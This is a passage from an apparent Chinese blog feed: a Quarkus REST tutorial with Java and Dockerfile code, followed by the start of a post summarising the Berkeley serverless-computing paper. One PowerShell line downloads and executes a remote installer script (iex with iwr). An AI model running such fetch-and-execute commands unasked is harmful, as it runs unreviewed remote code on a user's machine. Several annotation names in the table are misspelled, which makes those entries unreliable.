id="常用注解以及restful程序编写">常用注解以及RESTful程序编写</h1><h2 id="生成项目">生成项目</h2><h3 id="官方项目生成网页">官方项目生成网页</h3><p>类似start.spring.io一样，Quarkus官方也有类似的网页，地址：<ahref="https://code.quarkus.io/">Quarkus - Start coding withcode.quarkus.io</a></p><p>比如在RESTful项目中，最基本需要两个依赖库：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822161709836.png" /></p><p>直接下载到本地就可以使用了。</p><h3 id="idea生成项目">IDEA生成项目</h3><p>在Ultimate版本中继承了Jetbrains闭源的插件，直接从这里进去就可以了，和Spring那个一样一样的。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822161817772.png" /></p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822162058472.png" /></p><p>quarkus中最基本的rest服务需要JAX-RS这个组件，关于json的插件你可以用自己喜欢的，比如Jackson或者JSON-B，这里用Jackson。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822162226809.png" /></p><h3 id="安利一个工具quarkus-cli">安利一个工具：Quarkus-cli</h3><p>在官方的教程里，每次新建一个项目都需要敲很多的参数，个人觉得有点麻烦，好比这样的：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn io.quarkus:quarkus-maven-plugin:2.1.3.Final:create \</span><br><span class="line">    -DprojectGroupId=org.acme \</span><br><span class="line">    -DprojectArtifactId=rest-json-quickstart \</span><br><span class="line">    -DclassName=&quot;org.acme.rest.json.FruitResource&quot; \</span><br><span class="line">    -Dpath=&quot;/fruits&quot; \</span><br><span class="line">    -Dextensions=&quot;resteasy,resteasy-jackson&quot;</span><br></pre></td></tr></table></figure><p>实际上在官方的页面里有推荐这么一个官方的小工具，可以帮助你新建一个项目，其实和Go语言里的<code>Beego</code>中的<code>bee</code>工具作用差不多：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822140736545.png" style="zoom: 67%;" /></p><p><strong>只不过这玩意儿貌似还在改进中，但是实测可以用。</strong>安装方法如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先安装JBang，这个小玩意儿还挺有意思的，可以看看：https://www.jbang.dev/</span></span><br><span class="line"><span class="built_in">iex</span> <span class="string">&quot;&amp; &#123; <span class="variable">$</span>(iwr https://ps.jbang.dev) &#125; app setup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后我推荐你先去阿里云仓库下载quarkus-cli的runner包，然后再安装.</span></span><br><span class="line"><span class="comment"># https://developer.aliyun.com/mvn/search 搜索quarkus-cli，然后找到quarkus-cli-2.1.0.Final-runner.jar就行，这是最新的</span></span><br><span class="line"><span class="comment"># 然后jbang命令安装，这里我取名为quarkus。建议把jar包放到本地maven仓库的io.quarkus.quarkus-cli文件夹下</span></span><br><span class="line">jbang app install <span class="literal">--force</span> <span class="literal">--fresh</span> <span class="literal">--name</span> quarkus &lt;你的jar包的位置&gt;</span><br></pre></td></tr></table></figure><p>安装后就可以正常用了：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822141629148.png" style="zoom: 80%;" /></p><p>默认的create不带子命令就是在创建应用，<strong>Quarkus-cli创建项目时候有一个非常Nice的参数：--dry-run，对没错就是k8s那个dry-run，你可以预览并检查生成的选项而不是直接生成项目。好比这样：</strong></p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822142927709.png" style="zoom:80%;" /></p><p>我只能说好用的一批。好比我们创建一个rest-demo项目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">quarkus create cn.edu.xidian:quarkus<span class="literal">-rest-demo</span> <span class="literal">-P</span> <span class="number">2.1</span>.<span class="number">3</span>.Final</span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># Creating an app (default project type, see --help).</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># applying codestarts...</span></span><br><span class="line"><span class="comment"># &gt;&gt; java</span></span><br><span class="line"><span class="comment"># &gt;&gt; maven</span></span><br><span class="line"><span class="comment"># &gt;&gt; quarkus</span></span><br><span class="line"><span class="comment"># &gt;&gt; config-properties</span></span><br><span class="line"><span class="comment"># &gt;&gt; dockerfiles</span></span><br><span class="line"><span class="comment"># &gt;&gt; maven-wrapper</span></span><br><span class="line"><span class="comment"># &gt;&gt; resteasy-codestart</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment"># [SUCCESS] quarkus project has been successfully generated in:</span></span><br><span class="line"><span class="comment"># --&gt; C:\Users\22629\IdeaProjects\quarkus-rest-demo</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment"># Navigate into this directory and get started: quarkus dev</span></span><br></pre></td></tr></table></figure><p>项目结构如下，可以对比Spring发现多了docker的文件夹，其他没啥区别。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822143308436.png" /></p><p>编写结束后如果要启动项目只需要在项目文件夹下执行<code>quarkus dev</code>就可以了，也不需要<code>mvn compile quarkus:dev</code>了，这个工具还是很方便的。</p><h2 id="常用注解">常用注解</h2><p>下面小结一下在Quarkus框架中常用的注解，这里主要是编写Restful服务常用的。Quarkus的ioc和rest规范都是跟从的官方，即：</p><ul><li>ioc使用的是JSR 299和JSR 330</li><li>rest使用的是JAX-RS</li></ul><p>所以其实很多注解都是从上面这些依赖中了来的。下表是我自己总结的常用的Quarkus中的注解，后续我会继续添加这个表</p><table><colgroup><col style="width: 30%" /><col style="width: 69%" /></colgroup><thead><tr class="header"><th>注解名称</th><th>注解含义</th></tr></thead><tbody><tr class="odd"><td><strong>Rest类： javax.wx.rs包</strong></td><td></td></tr><tr class="even"><td><span class="citation" data-cites="Path">@Path</span></td><td>指明web的请求路径，比如@Path('/book/{name}')，<strong>类似Spring的@RequestMapping</strong></td></tr><tr class="odd"><td><span class="citation"data-cites="PathParameter">@PathParameter</span></td><td>配合@Path注解获取GET参数，比如上面那个的获取方法：public void func(<span class="citation"data-cites="PathParameter">@PathParameter</span>('name') String name){}</td></tr><tr class="even"><td><span class="citation" data-cites="Produces">@Produces</span></td><td>指明这个类所有函数/单个函数返回的参数类型，比如REST项目@Produces(MediaType.APPLICATION_JSON)</td></tr><tr class="odd"><td><span class="citation" data-cites="Consumes">@Consumes</span></td><td>指明这个函数所有函数/单个函数<strong>接收</strong>的参数类型，比如REST项目@Consumes(MediaType.APPLICATION_JSON)</td></tr><tr class="even"><td><span class="citation" data-cites="GET">@GET</span></td><td>声明GET方法，<strong>类似Spring的@GetMapping</strong></td></tr><tr class="odd"><td><span class="citation" data-cites="POST">@POST</span></td><td>声明POST方法，<strong>类似Spring的@PostMapping</strong></td></tr><tr class="even"><td><span class="citation" data-cites="DELETE">@DELETE</span></td><td>声明DELETE方法</td></tr><tr class="odd"><td><span class="citation" data-cites="PUT">@PUT</span></td><td>声明PUT方法</td></tr><tr class="even"><td></td><td></td></tr><tr class="odd"><td><strong>Bean相关类</strong></td><td></td></tr><tr class="even"><td><span class="citation" data-cites="Injection">@Injection</span></td><td>声明一个可以被注入的类、方法、变量，<strong>类似@Autowired</strong></td></tr><tr class="odd"><td><span class="citation" data-cites="Singleton">@Singleton</span></td><td>同@Inject，但是同时他也是个单例，<strong>类似Spring的@Component</strong></td></tr><tr class="even"><td><span class="citation"data-cites="ApplicationScoped">@ApplicationScoped</span></td><td>声明一个全局变量的bean</td></tr><tr class="odd"><td></td><td></td></tr><tr class="even"><td><strong>配置类</strong></td><td></td></tr><tr class="odd"><td><span class="citation"data-cites="ConfigProperty">@ConfigProperty</span></td><td>从配置文件(application.properties)中读取变量，比如@ConfigProperty(name="vartest",default="test")，即从配置文件中读取'vartest'变量的值，没有的话就是用default值</td></tr></tbody></table><h2 id="一个restful程序示例">一个RESTful程序示例</h2><blockquote><p>下面写一个简单的图书restful服务。</p></blockquote><p>Spring中我们将业务控制器分开，xxxController这种，Quarkus中喜欢把这个叫Resource，</p><p>我们先定义一个实体Book，<strong>这里注意，我们将使用Jackson来对对象进行序列化处理，所以一定要设置Getter，不然会获取不到属性，你也可以用<code>@JsonIgnore</code>注解来屏蔽一些属性</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/08/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 索书号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String indexId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 书本名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 作者信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String name, String indexId, String author)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;《&quot;</span> + name + <span class="string">&quot;》&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.indexId = indexId;</span><br><span class="line">        <span class="built_in">this</span>.author = author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIndexId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> indexId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAuthor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> author;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们定义对应的Resource，<strong>可以看到所有与RESTful相关的注解，都来自javax.ws.rx包，都是JAX-RS规范。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.ws.rs.Path;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Produces;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Consumes;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.MediaType;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.GET;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.POST;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.DELETE;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/08/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Path(&quot;/book&quot;)</span></span><br><span class="line"><span class="meta">@Produces(MediaType.APPLICATION_JSON)</span></span><br><span class="line"><span class="meta">@Consumes(MediaType.APPLICATION_JSON)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookResource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Book&gt; bookList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BookResource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;书_1&quot;</span>, <span class="string">&quot;abcdefg1&quot;</span>, <span class="string">&quot;lzwgiter&quot;</span>));</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;书_2&quot;</span>, <span class="string">&quot;gfseffda&quot;</span>, <span class="string">&quot;lzwgiter&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">getAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@POST</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">addBook</span><span class="params">(Book book)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(book);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DELETE</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">delBook</span><span class="params">(Book book)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.removeIf(existBook -&gt; existBook.equals(book));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码编写后，我们<code>quarkus dev</code>让他运行：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822165316767.png" /></p><p>然后就可以请求服务了：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823102743229.png" /></p><h2 id="构建可执行文件">构建可执行文件</h2><blockquote><p>接下来的两小节包括构建可执行文件和Docker镜像，这里不推荐使用那个quarkus-cli，它不支持打包到docker，建议用mvn命令。</p></blockquote><p><strong>这里我是在Linux下构建的可执行文件</strong>，windows下我会报只能使用AMD平台的错误，而且即使是在<code>x64 Native Tools Command Prompt for VS 2019</code>下不能解决。</p><p>构建直接使用命令<code>mvn package -Pnative</code>。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823163646699.png" /></p><p>我虽然是在虚拟机里构建的，但是这个速度也有点慢了吧。。构建完成后会生成一个xx-runner的文件：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823164605102.png" style="zoom: 80%;" /></p><p>然后我们直接<code>./xxx-runner</code>启动就可以了，<strong>我这里用的是官方基于OracleGraavlVM定制的一个下游版本，叫Mandrel，这时候你就发现牛逼的地方了：</strong></p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823164745281.png" /></p><p>好家伙，22ms就起来了，我直呼<img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823165047294.png" alt="image-20210823165047294" style="zoom:150%;" /></p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823165225982.png"/></p><p>当然运行结果是一样的。</p><h2 id="构建docker镜像">构建Docker镜像</h2><p>这里只介绍最简单的办法,前面我们已经通过<code>mvn package -Pnative</code>命令完成构建了，<strong>此时在你的<code>src/main/docker</code>目录里可以看到一个Dockerfile.native，内容如下，这个不需要你写。</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####</span></span><br><span class="line"><span class="comment"># This Dockerfile is used in order to build a container that runs the Quarkus application in native (no JVM) mode</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Before building the container image run:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ./mvnw package -Pnative</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Then, build the image with:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># docker build -f src/main/docker/Dockerfile.native -t quarkus/quarkus-rest-demo .</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Then run the container using:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># docker run -i --rm -p 8080:8080 quarkus/quarkus-rest-demo</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="keyword">FROM</span> registry.access.redhat.com/ubi8/ubi-minimal:<span class="number">8.4</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /work/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> 1001 /work \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> <span class="string">&quot;g+rwX&quot;</span> /work \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> 1001:root /work</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=1001:root target/*-runner /work/application</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./application&quot;</span>, <span class="string">&quot;-Dquarkus.http.host=0.0.0.0&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>然后我们按照说明去Docker中构建镜像：</p><blockquote><p>docker build -f src/main/docker/Dockerfile.native -tquarkus/quarkus-rest-demo .</p></blockquote><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823172244162.png" /></p><p>到这里镜像就构建好了，就可以投入使用了：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823173013018.png" /></p><h1 id="参考学习">参考学习</h1><ul><li><a href="https://opensource.com/downloads/java-serverless-ebook">Aguide to Java serverless functions | Opensource.com</a></li><li><a href="http://quarkus.io/guides/cli-tooling">Quarkus - BuildingQuarkus apps with Quarkus Command Line Interface (CLI)</a></li><li><a href="https://github.com/graalvm/mandrel/releases">Releases ·graalvm/mandrel (github.com)</a></li><li><a href="http://quarkus.io/guides/rest-json">Quarkus - Writing JSONREST Services</a></li><li><a href="http://quarkus.io/guides/building-native-image">Quarkus -Building a Native Executable</a></li><li><a href="http://quarkus.io/guides/container-image">Quarkus -Container Images</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Quarkus -- A Kubernetes Native Java stack tailored for
OpenJDK HotSpot and GraalVM, crafted from the best of breed Java
libraries and standards.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该框架定义为Kubernetes原生框架，可以很好的解决Serverless架构下资源占用大、冷启动慢等问题，实际效果还是挺惊艳的。这一篇开始学习Quarkus框架，本篇内容如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;介绍基本概念&lt;/li&gt;
&lt;li&gt;学习写简单的RESTful项目&lt;/li&gt;
&lt;li&gt;学习构建可执行文件以及构建Docker镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/img/Quarkus学习（一）概述以及编写REST服务/55c78ef5546cbae1f7b88dc2241019c7.jpeg&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="Quarkus" scheme="https://lzwgiter.github.io/tags/Quarkus/"/>
    
  </entry>
  
  <entry>
    <title>Cloud Programming Simplified:A Berkeley View on Serverless Computing</title>
    <link href="https://lzwgiter.github.io/posts/e88577c0.html"/>
    <id>https://lzwgiter.github.io/posts/e88577c0.html</id>
    <published>2021-08-19T02:39:40.000Z</published>
    <updated>2021-08-31T01:06:08.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇论文深入探讨了ServerlessComputing这个较新的云计算概念，并讨论了它的来源、想要解决的问题等等。最近也是接触了一些新的云技术的思想和技术，尤其是自接触了Kubernetes和Quarkus，触发了我对这个领域的好奇心。云计算领域之前也有写过文章<ahref="https://float311.gitee.io/posts/662e1cfe.html">微服务入门-5W和微服务思想· float'sblog</a>，但是当时只是简单的看了一下供微服务应用底层使用的一些平台，比如IaaS、PaaS，FaaS等等，也只简单了解了Serverless的概念。故跟着学习一下。</p></blockquote><span id="more"></span><h1 id="摘要">摘要</h1><p>文章摘要主要叙述了以下重点内容：</p><ul><li>说明Serverless cloud computing的特点和作用：<ul><li>让编程人员更容易的使用云资源</li><li>提供了一种接口，极大的简化了云原生(<code>cloud programming</code>)编程以及代表了从汇编语言向高级编程语言转化的过程</li></ul></li><li>概述了云计算的历史，包括：<ul><li>回顾2009年UCB的云计算的文章：《Above the clouds: A Berkeley view ofcloud computing. Technical report》</li><li>阐述Serverless computing的动机</li><li>概述能够解决当前serverless技术局限性的应用</li><li>列出当前该技术的难题，以及探讨其背后学术研究的机会</li></ul></li><li>结语：</li></ul><blockquote><blockquote><p>Just as the 2009 paper identified challenges for the cloud andpredicted they would be addressed and that cloud use would accelerate,we predict these issues are solvable and that serverless computing willgrow to dominate the future of cloud computing.</p></blockquote><p>就如2009年的文章指出云计算的难点、预测他们会被解决并提出云技术会繁荣昌盛一样，我们预测当前serverlesscomputing出现的问题也会被解决，并且会主导今后的云计算未来。</p></blockquote><h1 id="第一章-serverless-computing介绍">第一章 ServerlessComputing介绍</h1><p>在2009年伯克利的文章《Above the clouds: A Berkeley view of cloudcomputing. Technicalreport》中，文章叙述了六个云计算的潜在可被挖掘的优点：</p><ul><li>可以按需提供无限的计算资源</li><li>消除对云用户的预先承诺<code>the elimination of an up-front commitment by cloud users</code>（<strong>没看懂什么意思</strong>）</li><li>可以提供短期内交付所需计算资源的能力</li><li>由于使用了<strong>很多、很大</strong>的数据中心，所以提供了显著降低了成本的规模经济<code>Economies of scale</code></li><li>通过资源虚拟化来简化操作流程并提高了资源利用率</li><li>通过复用来自不通组织的工作负载来提高硬件利用率</li></ul><p>但是2009年提出的这些优势，在这十年间(到2019年)上述的六个优势的最后两个没有实现，即：云用户的操作依旧很复杂、多个工作负载也没有从高效的多路复用中获取收益。这两个问题具体展开来说问题如下：</p><ul><li>云计算让用户避免了直接管理物理基础设施，<strong>但是用户仍需要去管理大量的虚拟资源</strong>。</li><li>多路复用在批类型的工作负载中(比如Hadoop的MapReduce或者高性能计算)表现的很好，这些类型都可以充分利用他们分配的实例。但是对于一些有状态的服务，比如数据库管理系统，移植到云上则会影响工作效果。(原因是因为数据库通常上需要长期保留实例，然而他们的工作负载可能是突发性的，这会导致较低的资源利用率)</li></ul><p>2009年的时候，在云计算虚拟化领域主要有两个解决方案：</p><ul><li>Amazon EC2</li><li>Google App Engine</li></ul><p>前者(EC2)属于更偏底层的方案，实际上市场也选择了Amazon的EC2，但是缺点随之而来，那就是开发人员得自己管理虚拟机，基本包括就是作为系统管理员或者跟系统管理员一块设置开发环境，下面列出了在云上直接操作环境，你自己要考虑的事情：</p><ol type="1"><li>你得保证可用性，避免一个机器宕机导致服务不可用</li><li>对副本进行地理隔离，避免灾害来了一锅端</li><li>为了合理利用资源，你需要考虑负载均衡以及路由</li><li>要能根据变化来自动伸缩(<strong>Autoscaling</strong>)系统</li><li>要有后台监控来保证服务一直运行</li><li>要有日志记录来为后期提供调试(debug)和性能调优</li><li>定期系统升级，包括安全补丁</li><li>如果有新的实例可用，要提供可以直接迁移的能力</li></ol><p><strong>所以，上述这些要求的步骤或者叫能力，所需要的时间精力相比于你正儿八经去实现业务功能要复杂，自然是划不来的了。</strong></p><p>基于上述这些问题，Amazon在2015年也退出了一个叫AWS Lambdaservice的服务，Lambda提供了<code>cloud functions</code>的功能，并引发了大家对于<code>serverless computing</code>的关注，这个技术带来了一大特性：<strong>用户只需要编写代码就可以了，剩下的服务器配置以及管理任务留给云提供商就可以了。</strong>所以就诞生了FaaS这种东西(Functionas a Service)，FaaS的概念<ahref="https://float311.gitee.io/微服务入门-5W和微服务思想/#FaaS">我前面有总结</a>。此外除了FaaS平台，云平台商业提供了一些定制化serverless框架，比如BaaS（Backendas a Service）。文章对<em>Serverless Computing</em>下的简单定义为：</p><blockquote><p><em>serverless-computing = FaaS + BaaS</em></p></blockquote><p>具体来说：一个服务如果是Serverless的，那么他必须可以在无显式配置的情况下可以实现autoscaling，并且根据使用情况来进行收费。</p><p>最后小结：本文会像之前2009年文章一样，对云计算领域进行讨论，列举出挑战以及学术研究价值。</p><blockquote><p>While we are unsure which solutions will win, we believe all issueswill all be addressed eventually, thereby enabling serverless computingto become the face of cloud computing.</p></blockquote><p>文章预测serverless技术会成为云计算领域技术的代表(face啊)。</p><h1 id="第二章-serverless-computing技术的出现">第二章 ServerlessComputing技术的出现</h1><p>在Serverless平台下，用户只需要用高级编程语言实现业务逻辑就可以了，其他的如实例选举、扩容、部署、容错、监控、日志记录、安全补丁等等操作都交由serverless系统平台自己处理。</p><p>下表表示传统方案和Serverless方案的区别，文章将传统方案称为<strong><em>serverfulcloudcomputing</em></strong>(后续我也直接这么写，代表传统方案)。这两种方案代表基于函数的/以服务器为中心的计算平台的端点(endpoint)，而如Kubernetes这样的容器编排框架则代表中间体。</p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819180804653.png"alt="image-20210819180804653" /><figcaption 